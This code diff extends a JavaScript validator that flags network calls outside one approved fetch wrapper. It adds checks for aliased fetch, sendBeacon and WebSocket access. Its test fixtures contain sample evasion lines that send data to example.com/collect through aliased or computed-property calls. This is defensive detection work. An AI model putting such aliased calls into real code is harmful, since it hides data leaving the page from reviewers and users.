@@ -29,6 +29,15 @@ function validatePortalNetworkBoundary(source, label) {
     );
   }
 
+  // A direct-call count alone misses aliases like const leak = window.fetch.
+  // Permit only the single token of the reviewed wrapper's fetch() call.
+  const fetchReferences = [...source.matchAll(/\bfetch\b/g)];
+  if (fetchReferences.length !== fetchCalls.length) {
+    findings.push(
+      `${label}: indirect fetch references and aliases are forbidden; found ${fetchReferences.length} references for ${fetchCalls.length} direct calls`
+    );
+  }
+
   const helper = source.match(
     /async function request\(url, options = \{\}\) \{([\s\S]*?)\n\}/
   );
@@ -39,8 +48,8 @@ function validatePortalNetworkBoundary(source, label) {
   }
 
   for (const primitive of ["XMLHttpRequest", "WebSocket", "EventSource"]) {
-    if (new RegExp(`\\b${primitive}\\s*\\(`).test(source)) {
-      findings.push(`${label}: unreviewed network primitive ${primitive}() is forbidden`);
+    if (new RegExp(`\\b${primitive}\\b`).test(source)) {
+      findings.push(`${label}: unreviewed network primitive ${primitive} is forbidden even through aliases`);
     }
   }
 
@@ -65,6 +74,13 @@ function validatePortalNetworkBoundary(source, label) {
 
   const beaconInvocationCount = [...source.matchAll(/\bnavigator\.sendBeacon\s*\(/g)].length;
   const beaconCalls = quotedLeadingArgumentCalls(source, "navigator\\.sendBeacon");
+  const beaconReferences = [...source.matchAll(/\bsendBeacon\b/g)].length;
+  if (beaconReferences !== beaconInvocationCount) {
+    findings.push(
+      `${label}: indirect sendBeacon access or alias is forbidden`
+    );
+  }
+
 
   if (beaconCalls.length !== beaconInvocationCount) {
     findings.push(
@@ -146,6 +162,49 @@ request("/api/health");
 navigator.sendBeacon("//example.com/collect", "{}");
 `,
     /sendBeacon target/
+  ],
+  [
+    "fetch alias alongside approved wrapper",
+    `async function request(url, options = {}) {
+  return fetch(url, options);
+}
+request("/api/health");
+const leak = window.fetch;
+leak("https://example.com/collect");
+`,
+    /indirect fetch references/
+  ],
+  [
+    "computed fetch property alongside approved wrapper",
+    `async function request(url, options = {}) {
+  return fetch(url, options);
+}
+request("/api/health");
+window["fetch"]("https://example.com/collect");
+`,
+    /indirect fetch references/
+  ],
+  [
+    "constructor alias",
+    `async function request(url, options = {}) {
+  return fetch(url, options);
+}
+request("/api/health");
+const Socket = window.WebSocket;
+new Socket("wss://example.com/socket");
+`,
+    /unreviewed network primitive WebSocket/
+  ],
+  [
+    "beacon alias",
+    `async function request(url, options = {}) {
+  return fetch(url, options);
+}
+request("/api/health");
+const beacon = navigator["sendBeacon"];
+beacon("https://example.com/collect", "{}");
+`,
+    /indirect sendBeacon/
   ]
 ]) {
   const findings = validatePortalNetworkBoundary(source, name);
